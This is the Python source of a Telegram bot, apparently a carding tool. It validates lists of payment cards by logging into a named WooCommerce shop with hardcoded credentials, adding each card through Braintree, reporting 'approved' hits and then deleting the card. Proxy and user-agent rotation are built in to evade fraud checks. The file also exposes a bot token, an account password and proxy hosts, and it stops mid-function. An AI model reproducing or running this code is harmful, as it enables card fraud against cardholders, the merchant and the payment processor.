"""
Woolroots Braintree Checker v6 — Proxy Auto-Rotate
Owner: @DarkCarder05
• Auto-rotates proxy every card
• Auto-rotates User-Agent every request
• Retries on proxy fail with next proxy (3 attempts)
• Premium TON emoji UI
"""
import os, re, time, base64, random, uuid, threading, logging, itertools
from threading import Lock
import requests
from bs4 import BeautifulSoup
import telebot
from telebot import types

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("wool")

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
BOT_TOKEN   = "8031306974:AAGj-WcGWWeapvJO1VjQf6zp_cqNSjyiBHs"
OWNER_ID    = 7077294261
OWNER_TAG   = "@whoh4sh"
BOT_NAME    = "TON B3 CHECKER"

SITE        = "https://www.woolroots.com"
LOGIN_URL   = f"{SITE}/my-account/"
ADD_PM_URL  = f"{SITE}/my-account/add-payment-method/"
AJAX_URL    = f"{SITE}/wp-admin/admin-ajax.php"
BT_GRAPHQL  = "https://payments.braintree-api.com/graphql"

LOGIN_USER  = "lagxd71@gmail.com"
LOGIN_PASS  = "90901212Aa@"

DELAY_MIN = 3
DELAY_MAX = 7
PROXY_MAX_RETRIES = 3

# ═══════════════════════════════════════════════════════════
# PROXY POOL
# ═══════════════════════════════════════════════════════════
# Agar provider username/password chahiye, yahan daal:
PROXY_USER = ""       # e.g. "youruser"
PROXY_PASS = ""       # e.g. "yourpass"

RAW_HOSTS = [
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
    "px051003.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780",
    "95.211.174.135:3128",
    "103.237.102.191:11111",
    "184.75.221.82:3118",
    "185.191.239.248:3128",
]

def _build_proxies():
    out = []
    for h in RAW_HOSTS:
        if PROXY_USER and PROXY_PASS:
            out.append(f"http://{PROXY_USER}:{PROXY_PASS}@{h}")
        else:
            out.append(f"http://{h}")
    return out

PROXIES = _build_proxies()

_proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None
_proxy_lock = Lock()

def next_proxy():
    """Round-robin proxy rotation."""
    if not _proxy_cycle: return None
    with _proxy_lock:
        return next(_proxy_cycle)

def proxy_dict(p):
    if not p: return None
    return {"http": p, "https": p}

def masked_proxy(p):
    if not p: return "DIRECT"
    # hide credentials if present
    if "@" in p:
        return p.split("@")[-1]
    return p.replace("http://", "").replace("https://", "")

# ═══════════════════════════════════════════════════════════
# UA ROTATION
# ═══════════════════════════════════════════════════════════
UAS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]
def rand_ua(): return random.choice(UAS)

# ═══════════════════════════════════════════════════════════
# PREMIUM EMOJI (by @rijif)
# ═══════════════════════════════════════════════════════════
EM = {
    "diamond":  ("💎", "5042050649248760772"),
    "crown":    ("👑", "5039727497143387500"),
    "crown2":   ("👑", "5039539210072097557"),
    "crown3":   ("👑", "5041792560368977040"),
    "fire":     ("❤️‍🔥", "5042225965518816316"),
    "star":     ("⭐️", "5042176294222037888"),
    "sparkle":  ("💫", "5042200814190330758"),
    "bolt":     ("⚡️", "5042334757040423886"),
    "top":      ("🔝", "5042102141611672423"),
    "money":    ("💰", "5039789890133296083"),
    "cash":     ("💵", "5040025580758631490"),
    "moneyw":   ("💸", "5039565276228617024"),
    "link":     ("🔗", "5042101437237036298"),
    "good":     ("✔️", "5039844895779455925"),
    "cross":    ("❌", "5040042498634810056"),
    "no":       ("🚫", "5039671744172917707"),
    "warn":     ("⚠️", "5039665997506675838"),
    "info":     ("ℹ️", "5042306247047513767"),
    "green":    ("🟢", "5039928501612839813"),
    "red":      ("🔴", "5042042652019655612"),
    "arrow_r":  ("➡️", "5042341817966658405"),
    "reload":   ("🔄", "5041837837914211014"),
    "bell":     ("🔔", "5042111805288089118"),
    "megaphone":("📣", "5041888071851705019"),
    "chat":     ("💬", "5040036030414062506"),
    "eyes":     ("👀", "5039623284056917259"),
    "wave":     ("👋", "5040033797031070992"),
    "like":     ("👍", "5039544445637231745"),
    "party":    ("🎉", "5039778134807806727"),
    "tongue":   ("🤭", "5039607036195636113"),
    "sad":      ("😥", "5040018571372004272"),
    "shield":   ("🛡", "5042328396193864923"),
    "brain":    ("🧠", "5040030395416969985"),
    "chart":    ("📊", "5042290883949495533"),
    "target":   ("📍", "5039775669496579510"),
    "pin":      ("📍", "5039895103947146186"),
    "skull":    ("💀", "5042209657527993345"),
    "trash":    ("🗑", "5039614900280754969"),
    "broom":    ("🧹", "5039751080808809534"),
    "moon":     ("🌕", "5039727604517570274"),
    "candle":   ("🕯", "5041976440803820473"),
    "copyright":("©", "5039810295522919687"),
}

def e(name, fb=None):
    item = EM.get(name)
    if not item: return fb or "•"
    fallback, eid = item
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

_MB = {
    **{chr(ord('A') + i): chr(0x1D400 + i) for i in range(26)},
    **{chr(ord('a') + i): chr(0x1D41A + i) for i in range(26)},
    **{chr(ord('0') + i): chr(0x1D7CE + i) for i in range(10)},
}
def bold(t): return "".join(_MB.get(c, c) for c in str(t))

# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
STOP_FLAG = {"stop": False}

def luhn_ok(number):
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
        if len(digits) < 12: return False
        s = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9: d -= 9
            s += d
        return s % 10 == 0
    except: return False

def parse_card(line):
    parts = re.split(r"[|/, ]+", line.strip())
    if len(parts) < 4: return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    cc = re.sub(r"\D", "", cc)
    if not (13 <= len(cc) <= 19): return None
    if not luhn_ok(cc): return None
    if not (mm.isdigit() and 1 <= int(mm) <= 12): return None
    if not (yy.isdigit() and len(yy) in (2, 4)): return None
    if not (cvv.isdigit() and len(cvv) in (3, 4)): return None
    mm = mm.zfill(2)
    if len(yy) == 4: yy = yy[2:]
    return cc, mm, yy, cvv

_BIN_CACHE = {}
def bin_lookup(cc):
    b = cc[:6]
    if b in _BIN_CACHE: return _BIN_CACHE[b]
    try:
        r = requests.get(f"https://lookup.binlist.net/{b}",
                         headers={"Accept-Version": "3"}, timeout=8).json()
        info = f"{r.get('scheme','-')} {r.get('type','-')} {r.get('brand','-')}".upper()
        bank = r.get('bank', {}).get('name', '-').upper()
        country = f"{r.get('country',{}).get('name','-')} {r.get('country',{}).get('emoji','')}"
        _BIN_CACHE[b] = (info, bank, country)
        return info, bank, country
    except:
        _BIN_CACHE[b] = ("UNKNOWN", "UNKNOWN", "UNKNOWN")
        return "UNKNOWN", "UNKNOWN", "UNKNOWN"

# ═══════════════════════════════════════════════════════════
# DELETE
# ═══════════════════════════════════════════════════════════
def extract_delete_link(html, base_url):
    try:
        soup = BeautifulSoup(html, "html.parser")
        for sel in ['a[href*="delete-payment-method"]', 'a[href*="delete"]']:
            el = soup.select_one(sel)
            if el and el.get("href"):
                href = el["href"]
                if href.startswith("http"): return href
                return base_url.rstrip("/") + "/" + href.lstrip("/")
        m = re.search(r'href="([^"]*delete-payment-method[^"]*)"', html, re.I)
        if m:
            href = m.group(1).replace("&amp;", "&")
            if href.startswith("http"): return href
            return base_url.rstrip("/") + "/" + href.lstrip("/")
    except: pass
    return None

def delete_payment_method(session, delete_url):
    try:
        r = session.get(delete_url, timeout=25)
        if r.status_code != 200:
            return False, f"GET {r.status_code}"
        m = re.search(r'name="_wpnonce" value="(.*?)"', r.text)
        if not m:
            m = re.search(r'name="woocommerce-delete-payment-method-nonce" value="(.*?)"', r.text)
        nonce = m.group(1) if m else None
        data = {"_wpnonce": nonce} if nonce else {}
        data["_wp_http_referer"] = "/my-account/add-payment-method/"
        soup = BeautifulSoup(r.text, "html.parser")
        for inp in soup.select("form input"):
            name = inp.get("name"); val = inp.get("value", "")
            if name and name not in data: data[name] = val
        r2 = session.post(delete_url, data=data, timeout=25,
                          headers={"Content-Type": "application/x-www-form-urlencoded",
                                   "Referer": delete_url})
        low = r2.text.lower()
        if any(k in low for k in ["deleted", "removed", "payment method successfully",
                                    "no payment methods", "no saved"]):
            return True, "deleted"
        if "delete-payment-method" not in r2.text:
            return True, "deleted"
        return False, "unclear"
    except Exception as ex:
        return False, f"EXC: {str(ex)[:40]}"

def ensure_clean_slate(session):
    try:
        r = session.get(ADD_PM_URL, timeout=25)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.select('a[href*="delete-payment-method"]'):
            href = a.get("href")
            if href:
                if not href.startswith("http"):
                    href = SITE.rstrip("/") + "/" + href.lstrip("/")
                delete_payment_method(session, href)
    except: pass

# ═══════════════════════════════════════════════════════════
# CORE — with proxy retry
# ═══════════════════════════════════════════════════════════
def check_card(line):
    """Wrapper with retry on proxy failure."""
    parsed = parse_card(line)
    if not parsed:
        return {"status": "error", "response": "INVALID_FORMAT", "card": line,
                "bin": "-", "bank": "-", "country": "-",
                "deleted": None, "delete_msg": "", "proxy": "-"}

    last_result = None
    for attempt in range(1, PROXY_MAX_RETRIES + 1):
        proxy = next_proxy()
        r = _attempt_check(parsed, proxy)
        if r["status"] != "proxy_dead":
            return r
        last_result = r
        logger.warning(f"proxy attempt {attempt} failed, retrying...")
        time.sleep(1.5)
    # all attempts failed
    last_result["status"] = "error"
    last_result["response"] = "ALL_PROXIES_FAILED"
    return last_result

def _attempt_check(parsed, proxy):
    cc, mm, yy, cvv = parsed
    proxies = proxy_dict(proxy)
    ua = rand_ua()

    s = requests.Session()
    s.headers.update({"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"})
    if proxies:
        s.proxies = proxies

    result_base = {"card": cc, "bin": "-", "bank": "-", "country": "-",
                   "deleted": None, "delete_msg": "",
                   "proxy": masked_proxy(proxy)}

    try:
        r = s.get(LOGIN_URL, timeout=25)
        m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
        if not m: return _err("LOGIN_NONCE_FAIL", result_base)

        r = s.post(LOGIN_URL,
                   headers={"Content-Type": "application/x-www-form-urlencoded",
                            "Referer": LOGIN_URL},
                   data={"username": LOGIN_USER, "password": LOGIN_PASS,
                         "woocommerce-login-nonce": m.group(1),
                         "_wp_http_referer": "/my-account/", "login": "Log in"},
                   timeout=25)
        if "logout" not in r.text.lower() and "/my-account" not in r.url:
            return _err("LOGIN_FAIL", result_base)

        ensure_clean_slate(s)

        r = s.get(ADD_PM_URL, headers={"Referer": LOGIN_URL}, timeout=25)
        m = re.search(r'"client_token_nonce":"(.*?)"', r.text)
        if not m: return _err("NO_CLIENT_NONCE", result_base)
        client_nonce = m.group(1)

        r = s.post(AJAX_URL,
                   headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "X-Requested-With": "XMLHttpRequest",
                            "Origin": SITE, "Referer": ADD_PM_URL},
                   data={"action": "wc_braintree_credit_card_get_client_token",
                         "nonce": client_nonce}, timeout=25)
        m = re.search(r'"data":"(.*?)"', r.text)
        if not m: return _err("NO_CLIENT_TOKEN", result_base)
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
        except: return _err("TOKEN_DECODE_FAIL", result_base)
        m = re.search(r'"authorizationFingerprint":"(.*?)"', decoded)
        if not m: return _err("NO_AUTH_FP", result_base)
        auth_fp = m.group(1)

        bt_headers = {
            "authority": "payments.braintree-api.com",
            "authorization": f"Bearer {auth_fp}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": ua,
        }
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "custom",
                                    "sessionId": str(uuid.uuid4())},
            "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                      " tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"),
            "variables": {"input": {
                "creditCard": {"number": cc, "expirationMonth": mm,
                               "expirationYear": yy, "cvv": cvv},
                "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard",
        }
        # Braintree through same proxy + fresh UA
        r = requests.post(BT_GRAPHQL, headers=bt_headers, json=payload,
                          proxies=proxies, timeout=30)
        try: j = r.json()
        except: return _err("BT_BAD_RESPONSE", result_base)

        if "errors" in j:
            err = str(j["errors"]).lower()
            if "cvv" in err or "security code" in err:
                return _ok("declined", "CVV_MISMATCH", cc, result_base)
            if "expired" in err or "expiration" in err:
                return _ok("declined", "EXPIRED_CARD", cc, result_base)
            if "invalid" in err or "not a valid" in err or "invalid number" in err:
                return _ok("declined", "INVALID_CARD", cc, result_base)
            return _ok("declined", f"BT: {err[:60]}", cc, result_base)

        token = (j.get("data", {}).get("tokenizeCreditCard", {}) or {}).get("token")
        if not token:
            return _ok("declined", "NO_TOKEN_FROM_BT", cc, result_base)

        r = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
        m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text)
        if not m: return _err("NO_ADD_NONCE", result_base)
        add_nonce = m.group(1)

        r = s.post(ADD_PM_URL,
                   headers={"Content-Type": "application/x-www-form-urlencoded",
                            "Origin": SITE, "Referer": ADD_PM_URL},
                   data={
                       "payment_method": "braintree_credit_card",
                       "wc-braintree-credit-card-card-type": "visa",
                       "wc-braintree-credit-card-3d-secure-enabled": "",
                       "wc-braintree-credit-card-3d-secure-verified": "",
                       "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                       "wc_braintree_credit_card_payment_nonce": token,
                       "wc_braintree_device_data": '{"correlation_id":"%s"}' % uuid.uuid4().hex,
                       "wc-braintree-credit-card-tokenize-payment-method": "true",
                       "woocommerce-add-payment-method-nonce": add_nonce,
                       "_wp_http_referer": "/my-account/add-payment-method/",
                       "woocommerce_add_payment_method": "1",
                   }, timeout=40)

        soup = BeautifulSoup(r.text, "html.parser")
        msg = ""
        try:
            el = soup.find("i", class_="nm-font nm-font-close")
            if el and el.parent: msg = el.parent.text.strip()
        except: pass
        if not msg:
            for sel in [".woocommerce-error li", ".woocommerce-message",
                        ".woocommerce-info", "ul.woocommerce-error"]:
                el = soup.select_one(sel)
                if el: msg = el.text.strip(); break
        low = (msg + " " + r.text[:1200]).lower()

        added = any(k in low for k in ["new payment method added",
                                         "payment method successfully added",
                                         "successfully added"])
        if added:
            r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
            del_url = extract_delete_link(r2.text, SITE)
            deleted = None; del_msg = ""
            if del_url:
                ok_del, del_msg = delete_payment_method(s, del_url)
                deleted = bool(ok_del)
            else:
                deleted = False; del_msg = "no link"
            result_base["deleted"] = deleted
            result_base["delete_msg"] = del_msg
            return _ok("approved", msg or "CARD ADDED", cc, result_base)

        if "duplicate card exists" in low:
            return _ok("declined", "DUPLICATE_CARD", cc, result_base)
        if "insufficient" in low or "not enough" in low:
            return _ok("declined", "INSUFFICIENT_FUNDS", cc, result_base)
        if "cvv" in low or "security code" in low:
            return _ok("declined", "CVV_MISMATCH", cc, result_base)
        if "gateway rejected" in low and "avs" in low:
            return _ok("declined", "GATEWAY_REJECTED:AVS", cc, result_base)
        if "risk" in low or "fraud" in low:
            return _ok("declined", msg[:100] or "RISK", cc, result_base)
        if any(k in low for k in ["declined", "invalid", "expired", "failed", "error"]):
            return _ok("declined", msg[:100] or "DECLINED", cc, result_base)
        return _ok("declined", msg[:100] or "DECLINED", cc, result_base)

    except (requests.exceptions.ProxyError,
            requests.exceptions.ConnectionError) as pe:
        # proxy dead — signal retry
        return {"status": "proxy_dead", "response": f"PROXY_DEAD: {str(pe)[:40]}",
                "card": cc, "bin": "-", "bank": "-", "country": "-",
                "deleted": None, "delete_msg": "",
                "proxy": masked_proxy(proxy)}
    except requests.exceptions.Timeout:
        return _err("TIMEOUT", result_base)
    except Exception as ex:
        return _err(f"EXC: {str(ex)[:60]}", result_base)
    finally:
        try: s.close()
        except: pass

def _ok(status, response, cc, base):
    info, bank, country = bin_lookup(cc)
    return {"status": status, "response": response, "card": cc,
            "bin": info, "bank": bank, "country": country,
            "deleted": base.get("deleted"), "delete_msg": base.get("delete_msg", ""),
            "proxy": base.get("proxy", "-")}

def _err(reason, base):
    info, bank, country = bin_lookup(base["card"])
    return {"status": "error", "response": reason, "card": base["card"],
            "bin": info, "bank": bank, "country": country,
            "deleted": None, "delete_msg": "",
            "proxy": base.get("proxy", "-")}

# ═══════════════════════════════════════════════════════════
# BOT
# ═══════════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
USER_STATS = {}

def main_kb(uid):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="ui_stats"),
        types.InlineKeyboardButton("💎 Hits", callback_data="ui_hits"),
    )
    kb.add(
        types.InlineKeyboardButton("🛡 Proxies", callback_data="ui_proxy"),
        types.InlineKeyboardButton("📖 Help", callback_data="ui_help"),
    )
    kb.add(
        types.InlineKeyboardButton("👑 Owner", url="https://t.me/DarkCarder05"),
    )
    return kb

def back_kb():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("◀ Back", callback_data="ui_main"))
    return kb

def welcome_text(name):
    return (
        f"{e('crown')} <b>╔══════════════════════════╗</b> {e('crown')}\n"
        f"<b>   {bold('TON B3 CHECKER')}   </b>\n"
        f"{e('diamond')} <b>╚══════════════════════════╝</b> {e('diamond')}\n\n"
        f"{e('wave')} <b>Welcome {name}!</b> {e('fire')}\n\n"
        f"{e('bolt')} <b>Gateway:</b> Braintree (B3) Auth\n"
        f"{e('pin')} <b>Site:</b> <code>woolroots.com</code>\n"
        f"{e('shield')} <b>Proxy:</b> <code>{len(PROXIES)} loaded</code>\n"
        f"{e('green')} <b>Status:</b> Online\n\n"
        f"{e('top')} <b>How to check:</b>\n"
        f"   {e('arrow_r')} Send any <code>.txt</code> file with cards\n"
        f"   {e('arrow_r')} Reply to that file with <code>/chk</code>\n"
        f"   {e('arrow_r')} Watch hits roll in {e('diamond')}\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"{e('crown2')} <b>Bot By {OWNER_TAG}</b> {e('star')}"
    )

def hit_text(r):
    del_line = ""
    if r.get("deleted") is True:
        del_line = f"┃ {e('broom')} <b>Deleted:</b> {e('good')}\n"
    elif r.get("deleted") is False:
        del_line = f"┃ {e('broom')} <b>Deleted:</b> {e('cross')} ({r.get('delete_msg','')})\n"

    return (
        f"{e('fire')} <b>╔══════════════════════════╗</b> {e('fire')}\n"
        f"<b>   {bold('APPROVED')}   </b>\n"
        f"{e('diamond')} <b>╚══════════════════════════╝</b> {e('diamond')}\n\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ {e('cash')} <b>CC</b> ➤ <code>{r['card']}</code>\n"
        f"┃ {e('target')} <b>Response</b> ➤ <b>{r['response']}</b>\n"
        f"┃ {e('bolt')} <b>Gateway</b> ➤ Braintree Auth\n"
        f"┃ {e('shield')} <b>Proxy</b> ➤ <code>{r.get('proxy','-')}</code>\n"
        f"{del_line}"
        f"┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"{e('money')} <b>BIN</b> ➤ <code>{r['bin']}</code>\n"
        f"{e('money')} <b>Bank</b> ➤ <code>{r['bank']}</code>\n"
        f"{e('pin')} <b>Country</b> ➤ <code>{r['country']}</code>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"{e('crown3')} <b>Bot By {OWNER_TAG}</b> {e('sparkle')}"
    )

def progress_text(done, total, ok, bad, risk, err, elapsed):
    bar_len = 12
    filled = int(bar_len * done / total) if total else 0
    bar = "▰" * filled + "▱" * (bar_len - filled)
    return (
        f"{e('bolt')} <b>╔══════════════════════════╗</b> {e('bolt')}\n"
        f"<b>   {bold('CHECKING...')}   </b>\n"
        f"{e('diamond')} <b>╚══════════════════════════╝</b> {e('diamond')}\n\n"
        f"{e('chart')} <b>Progress</b> ➤ <code>{done}/{total}</code>\n"
        f"<code>{bar}</code> <b>{int(100*done/total) if total else 0}%</b>\n\n"
        f"{e('diamond')} <b>Approved</b> ➤ <code>{ok}</code>\n"
        f"{e('cross')} <b>Declined</b> ➤ <code>{bad}</code>\n"
        f"{e('warn')} <b>Risk</b>     ➤ <code>{risk}</code>\n"
        f"{e('skull')} <b>Error</b>    ➤ <code>{err}</code>\n\n"
        f"{e('candle')} <b>Time</b> ➤ <code>{elapsed:.0f}s</code>\n"
        f"{e('reload')} <b>Rotating proxies + UAs</b>"
    )

# ═══════════════════════════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════════════════════════
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    name = msg.from_user.first_name or "User"
    USER_STATS.setdefault(msg.from_user.id, {"ok":0,"bad":0,"risk":0,"err":0,"total":0})
    bot.reply_to(msg, welcome_text(name), reply_markup=main_kb(msg.from_user.id))

@bot.message_handler(commands=["menu"])
def cmd_menu(msg):
    bot.reply_to(msg, f"{e('diamond')} <b>Main Menu</b>", reply_markup=main_kb(msg.from_user.id))

@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    STOP_FLAG["stop"] = True
    bot.reply_to(msg, f"{e('no')} <b>Stopping check...</b>")

@bot.message_handler(commands=["proxies"])
def cmd_proxies(msg):
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, f"{e('no')} <b>Not authorized</b>")
        return
    lst = "\n".join(f"{e('bolt')} <code>{masked_proxy(p)}</code>" for p in PROXIES)
    bot.reply_to(msg, f"{e('shield')} <b>Proxy Pool ({len(PROXIES)}):</b>\n\n{lst}")

@bot.message_handler(commands=["chk"])
def cmd_chk(msg):
    replied = msg.reply_to_message
    if not replied or not replied.document:
        bot.reply_to(msg,
            f"{e('pin')} <b>How to use:</b>\n\n"
            f"{e('arrow_r')} Send a <code>.txt</code> file with cards\n"
            f"{e('arrow_r')} Reply to it with <code>/chk</code>")
        return
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, f"{e('no')} <b>Not authorized</b>")
        return
    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        bot.reply_to(msg, f"{e('no')} <b>Only .txt files</b>")
        return
    try:
        file_info = bot.get_file(doc.file_id)
        content = bot.download_file(file_info.file_path).decode("utf-8", errors="ignore")
    except Exception as ex:
        bot.reply_to(msg, f"{e('warn')} Download failed: {ex}")
        return
    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]
    parsed = [l for l in lines if parse_card(l)]
    if not parsed:
        bot.reply_to(msg, f"{e('cross')} <b>No valid cards</b>")
        return
    STOP_FLAG["stop"] = False
    bot.reply_to(msg,
        f"{e('fire')} <b>╔══════════════════════════╗</b> {e('fire')}\n"
        f"<b>   {bold('STARTING CHECK')}   </b>\n"
        f"{e('bolt')} <b>╚══════════════════════════╝</b> {e('bolt')}\n\n"
        f"{e('pin')} <b>File</b> ➤ <code>{doc.file_name}</code>\n"
        f"{e('cash')} <b>Cards</b> ➤ <code>{len(parsed)}</code>\n"
        f"{e('shield')} <b>Proxies</b> ➤ <code>{len(PROXIES)}</code>\n\n"
        f"<i>Rotating every card {e('reload')}</i>")
    threading.Thread(target=run_check, args=(msg.chat.id, parsed, msg.from_user.id),
                     daemon=True).start()

def run_check(chat_id, cards, uid):
    total = len(cards)
    ok = bad = risk = err = 0
    delete_fail = 0
    status_msg = bot.send_message(chat_id, progress_text(0, total, 0, 0, 0, 0, 0))
    start = time.time()
    for i, card in enumerate(cards, 1):
        if STOP_FLAG["stop"]:
            bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id,
                text=f"{e('no')} <b>Stopped at {i-1}/{total}</b>", parse_mode="HTML")
            break
        try:
            r = check_card(card)
        except Exception as ex:
            r = {"status": "error", "response": f"EXC: {ex}", "card": card,
                 "bin": "-", "bank": "-", "country": "-",
                 "deleted": None, "delete_msg": "", "proxy": "-"}
        if r["status"] == "approved":
            ok += 1
            if r.get("deleted") is False: delete_fail += 1
            _send_hit(chat_id, r)
        elif r["status"] == "risk":
            risk += 1
        elif r["status"] == "declined":
            bad += 1
        else:
            err += 1
        if i % 2 == 0 or i == total:
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg.message_id,
                    text=progress_text(i, total, ok, bad, risk, err, time.time()-start),
                    parse_mode="HTML")
            except: pass
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
    elapsed = time.time() - start
    summary = (
        f"{e('crown')} <b>╔══════════════════════════╗</b> {e('crown')}\n"
        f"<b>   {bold('CHECK FINISHED')}   </b>\n"
        f"{e('star')} <b>╚══════════════════════════╝</b> {e('star')}\n\n"
        f"{e('chart')} <b>Total</b>       ➤ <code>{total}</code>\n"
        f"{e('diamond')} <b>Approved</b>    ➤ <code>{ok}</code>\n"
        f"{e('cross')} <b>Declined</b>    ➤ <code>{bad}</code>\n"
        f"{e('warn')} <b>Risk</b>        ➤ <code>{risk}</code>\n"
        f"{e('skull')} <b>Error</b>       ➤ <code>{err}</code>\n"
        f"{e('broom')} <b>Delete fail</b> ➤ <code>{delete_fail}</code>\n\n"
        f"{e('candle')} <b>Time</b> ➤ <code>{elapsed:.0f}s</code>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"{e('crown2')} <b>Bot By {OWNER_TAG}</b>"
    )
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id,
                              text=summary, parse_mode="HTML")
    except:
        bot.send_message(chat_id, summary, parse_mode="HTML")
    if uid in USER_STATS:
        USER_STATS[uid]["ok"] += ok
        USER_STATS[uid]["bad"] += bad
        USER_STATS[uid]["risk"] += risk
        USER_STATS[uid]["err"] += err
        USER_STATS[uid]["total"] += total

def _send_hit(chat_id, r):
    try:
        bot.send_message(chat_id, hit_text(r), parse_mode="HTML")
    except Exception as ex:
        logger.warning(f"hit send fail: {ex}")
    try:
        with open("hits_woolroots.txt", "a") as f:
            f.write(f"{r['card']} | {r['response']} | {r['bin']} | {r['bank']} | proxy={r.get('proxy')} | del={r.get('deleted')}\n")
    except: pass

# ═══════════════════════════════════════════════════════════
# CALLBACKS
# ═══════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: True)
def on_cb(c):
    d = c.data; uid = c.from_user.id
    try: bot.answer_callback_query(c.id)
    except: pass

    if d == "ui_main":
        bot.edit_message_text(chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=welcome_text(c.from_user.first_name or "User"),
            reply_markup=main_kb(uid), parse_mode="HTML")

    elif d == "ui_proxy":
        lst = "\n".join(f"{e('bolt')} <code>{masked_proxy(p)}</code>" for p in PROXIES)
        txt = (f"{e('shield')} <b>Proxy Pool ({len(PROXIES)})</b>\n"
               f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
               f"{lst}\n"
               f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
               f"{e('reload')} Auto-rotate per card")
        bot.edit_message_text(chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML")

    elif d == "ui_stats":
        st = USER_STATS.get(uid, {"ok":0,"bad":0,"risk":0,"err":0,"total":0})
        hits = 0
        try:
            with open("hits_woolroots.txt") as f:
                hits = sum(1 for _ in f if not _.startswith("#"))
        except: pass
        txt = (
            f"{e('chart')} <b>╔══════════════════════════╗</b> {e('chart')}\n"
            f"<b>   {bold('YOUR STATS')}   </b>\n"
            f"{e('diamond')} <b>╚══════════════════════════╝</b> {e('diamond')}\n\n"
            f"{e('wave')} <b>User</b> ➤ <code>{uid}</code>\n\n"
            f"{e('pin')} <b>Your checks</b> ➤ <code>{st['total']}</code>\n"
            f"{e('diamond')} <b>Approved</b> ➤ <code>{st['ok']}</code>\n"
            f"{e('cross')} <b>Declined</b> ➤ <code>{st['bad']}</code>\n"
            f"{e('warn')} <b>Risk</b> ➤ <code>{st['risk']}</code>\n"
            f"{e('skull')} <b>Error</b> ➤ <code>{st['err']}</code>\n\n"
            f"{e('shield')} <b>Proxies</b> ➤ <code>{len(PROXIES)}</code>\n"
            f"{e('pin')} <b>Global hits</b> ➤ <code>{hits}</code>\n\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"{e('crown3')} <b>Bot By {OWNER_TAG}</b>"
        )
        bot.edit_message_text(chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML")

    elif d == "ui_hits":
        try:
            with open("hits_woolroots.txt") as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except: lines = []
        if not lines:
            txt = f"{e('diamond')} <b>No hits yet</b>"
        else:
